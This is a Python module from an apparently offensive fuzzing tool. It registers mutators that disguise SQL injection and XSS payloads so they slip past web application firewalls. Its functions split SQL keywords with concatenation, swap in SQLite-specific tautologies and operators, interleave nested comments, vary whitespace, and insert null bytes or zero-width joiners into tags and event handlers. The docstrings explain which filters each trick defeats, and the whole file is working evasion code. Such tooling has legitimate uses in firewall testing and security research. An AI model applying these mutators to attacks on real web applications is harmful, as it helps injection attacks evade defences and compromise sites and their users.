"""Semantic fragmentation mutators — break payloads into pieces that each
score below a scoring-engine's aggregation threshold, but reassemble as
valid SQL/XSS at the backend.

Designed from RedEye WAF intel: individual SQL keywords pass (200),
combinations trigger high scores (0.92+). The strategy is to fragment the
payload semantics across structures the scoring engine weights
independently.
"""
from __future__ import annotations

import re

from .base import REGISTRY

_SQL = {"SQL Injection", "NoSQL Injection"}
_XSS = {"XSS Injection"}

_KEYWORDS = (
    "UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
    "GROUP", "HAVING", "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
    "LIMIT", "NULL", "LIKE", "BETWEEN", "CASE", "WHEN", "THEN",
    "ELSE", "END",
)

_KEYWORD_RE = re.compile(
    r"\b(" + "|".join(_KEYWORDS) + r")\b", re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# SQLi fragmentation
# ---------------------------------------------------------------------------

def keyword_concat_split(s: str) -> str:
    """Split each SQL keyword into two string-concatenated halves using ||.

    `SELECT` -> `'SEL'||'ECT'`. The WAF sees two short string literals and
    a concat operator, none of which individually score as SQLi keywords.
    SQLite, PostgreSQL, Oracle all support || for string concatenation.
    """
    def split_kw(m: re.Match) -> str:
        kw = m.group(0)
        if len(kw) < 2:
            return kw
        mid = max(1, len(kw) // 2)
        return f"'{kw[:mid]}'||'{kw[mid:]}'"
    return _KEYWORD_RE.sub(split_kw, s)


def keyword_concat_split_mysql(s: str) -> str:
    """Split SQL keywords via MySQL CONCAT(): `SELECT` -> `CONCAT('SEL','ECT')`.

    MySQL does not support || for string concat by default (it's boolean OR),
    so this variant uses the CONCAT function form.
    """
    def split_kw(m: re.Match) -> str:
        kw = m.group(0)
        if len(kw) < 2:
            return kw
        mid = max(1, len(kw) // 2)
        return f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
    return _KEYWORD_RE.sub(split_kw, s)


def keyword_concat_split_mssql(s: str) -> str:
    """Split SQL keywords via MSSQL `+` concat: `SELECT` -> `'SEL'+'ECT'`."""
    def split_kw(m: re.Match) -> str:
        kw = m.group(0)
        if len(kw) < 2:
            return kw
        mid = max(1, len(kw) // 2)
        return f"'{kw[:mid]}'+'{kw[mid:]}'"
    return _KEYWORD_RE.sub(split_kw, s)


def sqlite_operator_swap(s: str) -> str:
    """Replace standard SQL operators with SQLite-specific equivalents.

    LIKE -> GLOB, IS NULL -> ISNULL, IS NOT NULL -> NOTNULL.
    libinjection fingerprints LIKE/IS NULL as SQLi but has no entry for
    GLOB/ISNULL/NOTNULL.
    """
    out = re.sub(r"\bLIKE\b", "GLOB", s, flags=re.IGNORECASE)
    out = re.sub(r"\bIS\s+NOT\s+NULL\b", "NOTNULL", out, flags=re.IGNORECASE)
    out = re.sub(r"\bIS\s+NULL\b", "ISNULL", out, flags=re.IGNORECASE)
    # GLOB uses * instead of % and ? instead of _
    out = out.replace("%", "*").replace("_", "?") if "GLOB" in out else out
    return out


def sqlite_iif_wrap(s: str) -> str:
    """Wrap boolean tautologies in SQLite's iif() function.

    `OR 1=1` -> `OR iif(1,1,0)=1`. iif() is SQLite 3.32+ and not in most
    WAF keyword lists.
    """
    out = re.sub(
        r"\b(\d+)\s*=\s*(\d+)\b",
        lambda m: f"iif({m.group(1)},{m.group(1)},0)={m.group(2)}",
        s,
    )
    return out


def sqlite_typeof_check(s: str) -> str:
    """Replace `1=1` tautology with `typeof(1)='integer'` — a SQLite
    function-based tautology that WAFs don't flag."""
    return re.sub(
        r"\b1\s*=\s*1\b",
        "typeof(1)='integer'",
        s,
    )


def sqlite_quote_tautology(s: str) -> str:
    """Replace `1=1` with `quote(1)='1'` — SQLite's quote() returns a SQL
    literal representation."""
    return re.sub(r"\b1\s*=\s*1\b", "quote(1)='1'", s)


_RAND_COMMENT_TAGS = ["a", "b", "c", "d", "e", "f", "g", "h"]


def comment_interleave_tagged(s: str) -> str:
    """Insert uniquely-tagged inline comments between every whitespace-
    separated token: `' OR 1=1--` -> `'/*a*/OR/*b*/1/*c*/=/*d*/1--`.

    Each comment has distinct content to defeat WAFs that collapse repeated
    `/**/` into nothing (like ModSecurity's t:removeComments).
    """
    tokens = s.split()
    if len(tokens) < 2:
        return s
    out = [tokens[0]]
    for i, tok in enumerate(tokens[1:]):
        tag = _RAND_COMMENT_TAGS[i % len(_RAND_COMMENT_TAGS)]
        out.append(f"/*{tag}*/{tok}")
    return "".join(out)


def comment_interleave_nested(s: str) -> str:
    """Insert nested comments between tokens: `/*/**/*/` — some WAFs
    match the first `*/` and leave the second as an unbalanced open comment
    that hides subsequent tokens from the rule engine."""
    return re.sub(r"\s+", "/*/**/*/", s)


_CASE_TAUT_RE = re.compile(r"\bOR\s+(\d+)\s*=\s*(\d+)\b", re.IGNORECASE)
_AND_TAUT_RE = re.compile(r"\bAND\s+(\d+)\s*=\s*(\d+)\b", re.IGNORECASE)


def case_wrap_or(s: str) -> str:
    """Wrap OR tautology in CASE WHEN: `OR 1=1` -> `OR CASE WHEN 1 THEN 1 END=1`."""
    return _CASE_TAUT_RE.sub(
        lambda m: f"OR CASE WHEN {m.group(1)} THEN {m.group(1)} END={m.group(2)}",
        s,
    )


def case_wrap_and(s: str) -> str:
    """Wrap AND tautology in CASE WHEN: `AND 1=1` -> `AND CASE WHEN 1 THEN 1 ELSE 0 END`."""
    return _AND_TAUT_RE.sub(
        lambda m: f"AND CASE WHEN {m.group(1)} THEN {m.group(1)} ELSE 0 END",
        s,
    )


def iif_wrap(s: str) -> str:
    """Wrap OR tautology in SQLite iif(): `OR 1=1` -> `OR iif(1,1,0)=1`."""
    return _CASE_TAUT_RE.sub(
        lambda m: f"OR iif({m.group(1)},{m.group(1)},0)={m.group(2)}",
        s,
    )


_WS_CHARS = ["\t", "\n", "\r", "\x0b", "\x0c"]


def whitespace_vary(s: str) -> str:
    """Replace each space with a cycling sequence of tab, newline, CR,
    vertical tab, form feed — none individually flagged by most WAFs."""
    out = []
    idx = 0
    for ch in s:
        if ch == " ":
            out.append(_WS_CHARS[idx % len(_WS_CHARS)])
            idx += 1
        else:
            out.append(ch)
    return "".join(out)


def whitespace_multispace(s: str) -> str:
    """Replace single spaces with double or triple spaces — simple but
    effective against regexes anchored to single-space token boundaries."""
    return s.replace(" ", "   ")


_TAUT_RE = re.compile(r"\b(\d+)\s*=\s*(\d+)\b")


def numeric_obfuscate_gt(s: str) -> str:
    """`1=1` -> `2>1` (semantically equivalent tautology)."""
    return _TAUT_RE.sub(
        lambda m: f"{int(m.group(1)) + 1}>{m.group(2)}" if m.group(1) == m.group(2) else m.group(0),
        s,
    )


def numeric_obfuscate_between(s: str) -> str:
    """`1=1` -> `1 BETWEEN 0 AND 2` (range-check tautology)."""
    return _TAUT_RE.sub(
        lambda m: f"{m.group(1)} BETWEEN 0 AND 2" if m.group(1) == m.group(2) else m.group(0),
        s,
    )


def numeric_obfuscate_in(s: str) -> str:
    """`1=1` -> `1 IN (1,2,3)` (set-membership tautology)."""
    return _TAUT_RE.sub(
        lambda m: f"{m.group(1)} IN ({m.group(1)},2,3)" if m.group(1) == m.group(2) else m.group(0),
        s,
    )


def numeric_obfuscate_string(s: str) -> str:
    """`1=1` -> `'a'='a'` (string tautology)."""
    return _TAUT_RE.sub(
        lambda m: "'a'='a'" if m.group(1) == m.group(2) else m.group(0),
        s,
    )


def numeric_obfuscate_scientific(s: str) -> str:
    """`1=1` -> `1e0=1e0` (scientific notation tautology)."""
    return _TAUT_RE.sub(
        lambda m: f"{m.group(1)}e0={m.group(2)}e0" if m.group(1) == m.group(2) else m.group(0),
        s,
    )


# ---------------------------------------------------------------------------
# XSS fragmentation
# ---------------------------------------------------------------------------

_TAG_RE = re.compile(r"<([a-zA-Z]+)")


def xss_null_in_tag(s: str) -> str:
    """Insert null byte in tag name: `<svg` -> `<sv\\x00g`. Some HTML
    parsers strip nulls before tokenizing, recovering the valid tag, while
    WAFs match the literal bytes."""
    def repl(m: re.Match) -> str:
        tag = m.group(1)
        if len(tag) < 2:
            return m.group(0)
        mid = len(tag) // 2
        return f"<{tag[:mid]}\x00{tag[mid:]}"
    return _TAG_RE.sub(repl, s)


def xss_zwj_in_handler(s: str) -> str:
    """Insert zero-width joiner (U+200D) inside event handler names:
    `onerror` -> `on\\u200Derror`. Some browsers strip ZWJ before
    attribute parsing."""
    return re.sub(
        r"(on)([a-zA-Z]+)",
        lambda m: f"{m.group(1)}‍{m.group(2)}",
        s,
    )


_RARE_EVENTS = [
    "onpointerover", "onanimationend", "ontransitionend", "onwheel",
    "onfocusin", "onbeforeinput", "onbeforetoggle", "ontouchstart",
    "onpointerrawupdate", "onselectstart", "oncontextmenu",
]

_COMMON_EVENTS_RE = re.compile(
    r"\b(onerror|onload|onclick|onmouseover|onfocus|onblur)\b",
    re.IGNORECASE,
)


def xss_rare_event_rotate(s: str) -> str:
    """Replace common event handlers with a rotating set of rarely-filtered
    alternatives: onpointerover, onanimationend, ontransitionend, onwheel,
    onfocusin, onbeforeinput, onbeforetoggle, ontouchstart."""
    idx = 0
    def repl(m: re.Match) -> str:
        nonlocal idx
        evt = _RARE_EVENTS[idx % len(_RARE_EVENTS)]
        idx += 1
        return evt
    return _COMMON_EVENTS_RE.sub(repl, s)


_SCRIPT_RE = re.compile(r"<script>", re.IGNORECASE)
_CLOSE_SCRIPT_RE = re.compile(r"</script>", re.IGNORECASE)


def xss_tag_self_close_confusion(s: str) -> str:
    """Use self-closing slash confusion: `<svg` -> `<svg/`. HTML5 parsers
    ignore the trailing slash on non-void elements but some WAF regex
    engines treat `<svg/>` as self-closed (no body to scan)."""
    return _TAG_RE.sub(lambda m: f"<{m.group(1)}/", s)


# ---------------------------------------------------------------------------
# Registration
# ---------------------------------------------------------------------------

def _register() -> None:
    R = REGISTRY

    # SQLi: string concat split (keyword fragmentation)
    R.add("sql_keyword_concat_split", keyword_concat_split, "obfuscator",
          "split SQL keywords into ||-concatenated halves (SQLite/PG/Oracle)",
          classes=_SQL)
    R.add("sql_keyword_concat_split_mysql", keyword_concat_split_mysql, "obfuscator",
          "split SQL keywords via CONCAT() (MySQL)", classes=_SQL)
    R.add("sql_keyword_concat_split_mssql", keyword_concat_split_mssql, "obfuscator",
          "split SQL keywords via + concatenation (MSSQL)", classes=_SQL)

    # SQLi: SQLite-specific operator substitution
    R.add("sql_sqlite_operator_swap", sqlite_operator_swap, "obfuscator",
          "LIKE->GLOB, IS NULL->ISNULL, IS NOT NULL->NOTNULL (SQLite)",
          classes=_SQL)
    R.add("sql_sqlite_iif_wrap", sqlite_iif_wrap, "obfuscator",
          "wrap numeric tautology in SQLite iif() function", classes=_SQL)
    R.add("sql_sqlite_typeof_check", sqlite_typeof_check, "obfuscator",
          "1=1 -> typeof(1)='integer' (SQLite function tautology)", classes=_SQL)
    R.add("sql_sqlite_quote_tautology", sqlite_quote_tautology, "obfuscator",
          "1=1 -> quote(1)='1' (SQLite quote() tautology)", classes=_SQL)

    # SQLi: comment interleave
    R.add("sql_comment_interleave_tagged", comment_interleave_tagged, "obfuscator",
          "uniquely-tagged inline comments between every token", classes=_SQL)
    R.add("sql_comment_interleave_nested", comment_interleave_nested, "obfuscator",
          "nested /*/**/*/  comments between tokens", classes=_SQL)

    # SQLi: CASE/IIF wrapping
    R.add("sql_case_wrap_or", case_wrap_or, "obfuscator",
          "OR 1=1 -> OR CASE WHEN 1 THEN 1 END=1", classes=_SQL)
    R.add("sql_case_wrap_and", case_wrap_and, "obfuscator",
          "AND 1=1 -> AND CASE WHEN 1 THEN 1 ELSE 0 END", classes=_SQL)
    R.add("sql_iif_wrap", iif_wrap, "obfuscator",
          "OR 1=1 -> OR iif(1,1,0)=1 (SQLite)", classes=_SQL)

    # SQLi: whitespace variation
    R.add("sql_whitespace_vary", whitespace_vary, "encoder",
          "cycle spaces through tab/LF/CR/VT/FF", classes=_SQL)
    R.add("sql_whitespace_multispace", whitespace_multispace, "encoder",
          "single space -> triple space", classes=_SQL)

    # SQLi: numeric tautology obfuscation
    R.add("sql_numeric_obfuscate_gt", numeric_obfuscate_gt, "obfuscator",
          "1=1 -> 2>1 (greater-than tautology)", classes=_SQL)
    R.add("sql_numeric_obfuscate_between", numeric_obfuscate_between, "obfuscator",
          "1=1 -> 1 BETWEEN 0 AND 2", classes=_SQL)
    R.add("sql_numeric_obfuscate_in", numeric_obfuscate_in, "obfuscator",
          "1=1 -> 1 IN (1,2,3)", classes=_SQL)
    R.add("sql_numeric_obfuscate_string", numeric_obfuscate_string, "obfuscator",
          "1=1 -> 'a'='a' (string tautology)", classes=_SQL)
    R.add("sql_numeric_obfuscate_scientific", numeric_obfuscate_scientific, "obfuscator",
          "1=1 -> 1e0=1e0 (scientific notation)", classes=_SQL)

    # XSS: tag/handler fragmentation
    R.add("xss_null_in_tag", xss_null_in_tag, "obfuscator",
          "null byte inside tag name (<sv\\x00g>)", classes=_XSS)
    R.add("xss_zwj_in_handler", xss_zwj_in_handler, "obfuscator",
          "zero-width joiner inside event handler names", classes=_XSS)
    R.add("xss_rare_event_rotate", xss_rare_event_rotate, "obfuscator",
          "rotate common handlers to onpointerover/onanimationend/etc",
          classes=_XSS)
    R.add("xss_tag_self_close_confusion", xss_tag_self_close_confusion, "obfuscator",
          "<tag -> <tag/ self-close confusion", classes=_XSS)


_register()
